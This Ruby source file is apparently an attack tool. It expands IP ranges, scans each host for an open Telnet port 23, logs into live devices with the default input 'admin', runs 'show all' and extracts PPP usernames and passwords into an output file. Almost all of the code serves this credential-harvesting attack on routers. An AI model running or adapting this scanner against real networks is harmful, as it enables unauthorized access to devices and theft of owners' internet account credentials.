
def ipgen (input) 

		ip=input.split(".") 

		if (ip[1].include? '-')
			ip_rang="a"
		elsif (ip[2].include? '-')
			ip_rang="b"
		elsif (ip[3].include? '-')
			ip_rang="c"
		else 
			singelip = Array.new
			singelip.push(input)
			return singelip 
		end


	
	begin
		
		ip_stack= Array.new

		if (ip_rang == "c")
			c_rang=ip[3].split("-")  

			
			c_rang_start=Integer(c_rang[0])  
			c_rang_end=Integer(c_rang[1]) 

			while (c_rang_start<=c_rang_end) do
				ip_stack.push ("#{ip[0]}.#{ip[1]}.#{ip[2]}.#{c_rang_start}")
				c_rang_start+=1
			end
		elsif (ip_rang == "b")
			b_rang=ip[2].split("-")
			c_rang=ip[3].split("-") 
			
			b_rang_start=Integer(b_rang[0])
			b_rang_end=Integer(b_rang[1])
			c_rang_start=Integer(c_rang[0])  
			c_rang_end=Integer(c_rang[1]) 

			while (b_rang_start<=b_rang_end) do
				c_rang_start=Integer(c_rang[0]) 
				while (c_rang_start<c_rang_end) do
				ip_stack.push ("#{ip[0]}.#{ip[1]}.#{b_rang_start}.#{c_rang_start}")
				c_rang_start+=1
				end
			ip_stack.push ("#{ip[0]}.#{ip[1]}.#{b_rang_start}.#{c_rang_start}")
			b_rang_start +=1
			end
		elsif (ip_rang == "a")
				a_rang=ip[1].split("-")
				b_rang=ip[2].split("-")
				c_rang=ip[3].split("-") 

				
				a_rang_start=Integer(a_rang[0])
				a_rang_end=Integer(a_rang[1])

				b_rang_start=Integer(b_rang[0])
				b_rang_end=Integer(b_rang[1])
			
				c_rang_start=Integer(c_rang[0])  
				c_rang_end=Integer(c_rang[1]) 
			while (a_rang_start<=a_rang_end) do
				b_rang_start=Integer(b_rang[0]) 
				while (b_rang_start<b_rang_end) do
					c_rang_start=Integer(c_rang[0]) 
					while (c_rang_start<c_rang_end) do
					ip_stack.push ("#{ip[0]}.#{a_rang_start}.#{b_rang_start}.#{c_rang_start}")
					c_rang_start+=1
					end
				ip_stack.push ("#{ip[0]}.#{a_rang_start}.#{b_rang_start}.#{c_rang_start}")
				b_rang_start +=1
				end
			ip_stack.push ("#{ip[0]}.#{a_rang_start}.#{b_rang_start}.#{c_rang_start}")
			a_rang_start +=1
			end
		end
		ip_stack
	rescue
		puts "Error : unable to generat ip adress"
	end 
end 

def scan(host)
		begin
	        timeout($timeout) do
	            sRaw=TCPSocket.open(host,23)
	            $alive_hosts.push(host) if sRaw != nil
	        	puts "[+] #{host} - Alive \n" if $verbose    
	            sRaw.close
	        end
	      rescue (Timeout::Error)
	          puts "[!] #{host} - Time out\n"  if $verbose
	      rescue (Errno::ECONNREFUSED)
	          puts "[x] #{host} - Connection refused\n"  if $verbose
	      rescue (Errno::EHOSTUNREACH)
	          puts "[x] #{host} - Host unreachable\n" if $verbose
	    end
end

def checkpwd(host)	
	host_crd=Hash.new
	begin
		host=Net::Telnet::new("Host" => "#{host}",
							  "Timeout" => 10,
							  "Prompt" => /[$%#>] \z/)
		host.cmd("admin") 
		result=host.cmd("show all") 
		
		host.close
		if result != nil 
		ppp_usr = result.match(/PPP User.*/)  
		ppp_pwd = result.match(/PPP Pass.*/)  
		host_crd = {
			"usr" => ppp_usr,
			"pwd" => ppp_pwd
		}
		else
			host_crd = nil
		end 

		return host_crd
	rescue (Timeout::Error)

		puts "[!] Timeout\n" if $verbose
	rescue 	(Errno::ECONNRESET)
		puts "[x] Connection refused\n" if $verbose
	end
end

def export(filename,data)
	begin
		outfile= File.new(filename,'a')
		outfile.write(data)
		outfile.write("*****************\n")
		outfile.close
	rescue 
		
	end
end